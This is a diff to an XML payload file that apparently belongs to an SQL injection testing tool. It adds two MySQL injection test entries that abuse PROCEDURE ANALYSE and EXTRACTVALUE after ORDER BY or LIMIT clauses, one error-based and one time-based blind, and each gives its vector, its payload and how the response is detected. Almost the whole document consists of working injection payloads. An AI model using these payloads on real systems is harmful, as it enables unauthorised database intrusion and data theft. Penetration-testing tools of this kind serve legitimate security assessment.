@@ -1693,6 +1693,27 @@ Formats:
     -->
     <!-- End of error-based tests - WHERE or HAVING clause -->
 
+    <!-- Error-based tests - After ORDER BY...LIMIT... -->
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>0</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+    <!-- End of error-based tests - After ORDER BY...LIMIT... -->
 
     <!-- Error-based tests - Parameter replace -->
     <test>
@@ -2980,7 +3001,6 @@ Formats:
     <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of AND time-based blind tests -->
 
-
     <!-- OR time-based blind tests -->
     <test>
         <title>MySQL &gt; 5.0.11 OR time-based blind</title>
@@ -3281,6 +3301,27 @@ Formats:
     <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of OR time-based blind tests -->
 
+    <!-- Time-based tests - After ORDER BY...LIMIT... -->
+    <test>
+        <title>MySQL &gt;= 5.1 time-based blind - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+    <!-- Time-based tests - After ORDER BY...LIMIT... -->
 
     <!-- Time-based blind tests - Parameter replace -->
     <test>
